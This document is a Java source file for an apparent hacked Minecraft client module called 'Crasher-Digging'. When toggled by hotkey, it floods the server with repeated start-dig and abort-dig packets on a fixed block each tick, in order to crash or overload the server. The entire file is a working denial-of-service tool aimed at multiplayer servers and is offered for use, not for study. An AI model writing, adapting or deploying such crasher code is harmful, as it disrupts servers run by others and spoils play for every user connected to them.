package dev.o2w9d8.client.module.crashing;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C07PacketPlayerDigging;
import net.minecraft.util.BlockPos;
import org.lwjgl.input.Keyboard;
import dev.o2w9d8.client.module.Category;
import dev.o2w9d8.client.module.Module;

public class DiggingCModule extends Module {

	private static final long PACKET_COUNT = Long.MAX_VALUE; // Number of packets to send

	public DiggingCModule() {
		super("2w9d8_Crasher-Digging", Keyboard.KEY_GRAVE, Category.CRASHING);
	}

	@Override
	public void onUpdate() {
		if (this.isToggled()) {
			sendPackets();
		}
	}

	private void sendPackets() {
		BlockPos targetBlock = new BlockPos(0, -1, 0); // Coordinates of the block to break

		for (long i = 15; i < 1000; i++) {
			sendPlayerDiggingPacket(C07PacketPlayerDigging.Action.START_DESTROY_BLOCK, targetBlock);
			sendPlayerDiggingPacket(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, targetBlock);
		}
	}

	private void sendPlayerDiggingPacket(C07PacketPlayerDigging.Action action, BlockPos targetBlock) {
		Minecraft minecraft = Minecraft.getMinecraft();
		C07PacketPlayerDigging packet = new C07PacketPlayerDigging(action, targetBlock,
				minecraft.objectMouseOver.sideHit);
		minecraft.getNetHandler().addToSendQueue(packet);
	}
}
